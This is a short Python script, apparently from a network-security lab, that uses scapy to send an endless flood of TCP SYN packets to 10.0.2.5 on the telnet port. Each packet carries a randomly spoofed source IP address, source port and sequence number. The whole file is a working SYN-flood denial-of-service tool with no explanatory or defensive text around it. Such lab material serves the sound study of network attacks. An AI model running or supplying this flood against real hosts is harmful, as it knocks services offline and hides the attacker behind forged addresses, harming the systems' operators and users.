#!/usr/bin/python3
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="10.0.2.5")
tcp = TCP(dport=23, flags='s')
pkt = ip/tcp

while True:
    # Set the source IP address to a random IPv4 address
    pkt[IP].src = str(IPv4Address(getrandbits(32)))
    # Set the source port to a random 16-bit number
    pkt[TCP].sport = getrandbits(16)
    # Set the sequence number to a random 32-bit number
    pkt[TCP].seq = getrandbits(32)
    # Send the modified packet, suppressing output with verbose=0
    send(pkt, verbose=0)